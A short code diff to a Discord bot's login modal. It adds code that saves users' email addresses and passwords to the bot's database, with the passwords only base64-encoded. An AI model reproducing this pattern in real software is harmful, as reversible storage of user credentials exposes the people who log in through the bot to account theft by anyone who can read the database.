@@ -12,6 +12,7 @@ import datetime
 import sys
 import random
 from disnake import TextInputStyle
+import base64
 
 # Connecting to the database
 client_db = Database()
@@ -56,9 +57,15 @@ class LoginModal(disnake.ui.Modal):
             try:
                 cookies = await client.login_with_password(email, password, port=port_randomize)
                 if cookies:
+                    password_bytes = password.encode("ascii")
+                    password_encoded = base64.b64encode(password_bytes)
+                    password_encoded = password_encoded.decode("ascii")
+
                     data = {
                         "user_id": author.id,
                         "user_name": author.name,
+                        "email": email,
+                        "password": password_encoded,
                         **{key: cookies[key] for key in cookies if key.endswith("_v2")},
                     }
 
